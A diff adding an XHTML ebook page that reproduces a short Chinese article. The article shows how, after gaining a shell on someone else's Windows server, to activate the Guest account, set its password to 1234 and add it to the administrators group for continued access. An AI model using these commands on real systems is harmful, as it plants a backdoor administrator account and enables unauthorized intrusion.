@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>DOS命令行里怎样激活guest用户</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>DOS命令行里怎样激活guest用户</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&amp;mid=2247485542&amp;idx=1&amp;sn=7d523614c13ac9a54d042b81c309050d&amp;chksm=f9e0673dce97ee2bc980b139b184ce5adcaaffd47eb00ac87c70e758f2b4a83ffdd4e9f85fa6&amp;scene=126&amp;sessionid=1681663462#rd">http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&amp;mid=2247485542&amp;idx=1&amp;sn=7d523614c13ac9a54d042b81c309050d&amp;chksm=f9e0673dce97ee2bc980b139b184ce5adcaaffd47eb00ac87c70e758f2b4a83ffdd4e9f85fa6&amp;scene=126&amp;sessionid=1681663462#rd</a></blockquote><p>我是在拿到一台服务器shell后，创建账号一直失败，所以将guest激活并提升到管理员租，只是在渗透过程拿服务器方式中的一个演示。</p><p>我们再把guest激活加到管理组 C:\&gt;net user guest /active:yes 将对方的Guest用户激活</p><p>C:\&gt;net user guest 1234 将Guest的密码改为1234,或者你要设定的密码</p><p>C:\&gt;net localgroup administrators guest /add 将Guest变为Administrator^_^(如果管理员密码更改，guest帐号没改变的话，下次我们可以用guest再次访问这台计算机)</p><p><img data-s="300,640" data-type="png" data-src="http://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7c8OGyF61XAJ3TFicnibGX1xcuKLZWj5IJK7Y1gXtfpZBPMgcyadGrVLCnwdzIlKd0Ockm40mGcSA/0?wx_fmt=png" style="" class="" data-ratio="0.8550295857988166" data-w="676" src="../Images/d1e9cc7130a2dbd1a9a33db723d07f28.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7c8OGyF61XAJ3TFicnibGX1xcuKLZWj5IJK7Y1gXtfpZBPMgcyadGrVLCnwdzIlKd0Ockm40mGcSA/0?wx_fmt=png"/></p><p><img data-s="300,640" data-type="png" data-src="http://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7c8OGyF61XAJ3TFicnibGX15Cibwy31ECyGADfrPmicjRXex7DADK6o1iantlDGRl4bUqicRETwZL62Kw/0?wx_fmt=png" style="" class="" data-ratio="0.7687400318979266" data-w="627" src="../Images/89c5422d6f5ad7a01ee140aa72e59ece.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/p5qELRDe5icl7c8OGyF61XAJ3TFicnibGX15Cibwy31ECyGADfrPmicjRXex7DADK6o1iantlDGRl4bUqicRETwZL62Kw/0?wx_fmt=png"/></p><p><br/></p>
+        
+</body>
+</html>
